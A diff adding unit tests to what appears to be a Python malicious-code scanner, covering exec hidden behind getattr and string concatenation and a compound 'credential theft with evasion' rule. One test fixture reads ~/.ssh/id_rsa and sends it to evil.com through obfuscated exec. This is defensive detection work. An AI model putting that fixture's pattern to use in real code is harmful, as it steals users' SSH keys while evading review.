@@ -436,6 +436,15 @@ def test_detect_getattr_builtins():
     content = "fn = getattr(__builtins__, 'exec')\nfn(payload)"
     obs = detect_indirect_exec(content, "evil.py")
     assert any("getattr_builtins" in o.category for o in obs)
+    assert any(o.severity == ObservationSeverity.MEDIUM for o in obs)
+
+
+def test_detect_getattr_string_concat_is_high():
+    """getattr(__builtins__, 'ex' + 'ec') -- string concat = HIGH, no legit use."""
+    content = "fn = getattr(__builtins__, 'ex' + 'ec')\nfn(payload)"
+    obs = detect_indirect_exec(content, "evil.py")
+    assert any("getattr_concat" in o.category for o in obs)
+    assert any(o.severity == ObservationSeverity.HIGH for o in obs)
 
 
 def test_detect_globals_dict_access():
@@ -480,3 +489,28 @@ fn(f"urllib.request.urlopen(urllib.request.Request('{ENDPOINT}', data=b'{encoded
     obs_indirect = detect_indirect_exec(content, "analytics.py")
     assert len(obs_behavioral) >= 1
     assert len(obs_indirect) >= 1
+    # The getattr concat should be HIGH
+    assert any(o.severity == ObservationSeverity.HIGH for o in obs_indirect)
+
+
+def test_compound_escalation_behavioral_plus_indirect():
+    """Compound rule: behavioral + indirect exec in same file → HIGH."""
+    content = '''
+import os, urllib.request
+home = os.path.expanduser("~")
+data = open(os.path.join(home, ".ssh", "id_rsa")).read()
+fn = getattr(__builtins__, 'exec')
+fn(f"urllib.request.urlopen(urllib.request.Request('https://evil.com', data=b'{data}'))")
+'''
+    obs = analyze_source(content, "stealer.py", FileClassification.SOURCE)
+    compound = [o for o in obs if o.category == "compound:credential_theft_with_evasion"]
+    assert len(compound) == 1
+    assert compound[0].severity == ObservationSeverity.HIGH
+
+
+def test_no_compound_escalation_without_behavioral():
+    """Indirect exec alone (no credential access) should NOT trigger compound."""
+    content = "fn = getattr(__builtins__, 'exec')\nfn('print(1)')"
+    obs = analyze_source(content, "util.py", FileClassification.SOURCE)
+    compound = [o for o in obs if o.category == "compound:credential_theft_with_evasion"]
+    assert compound == []
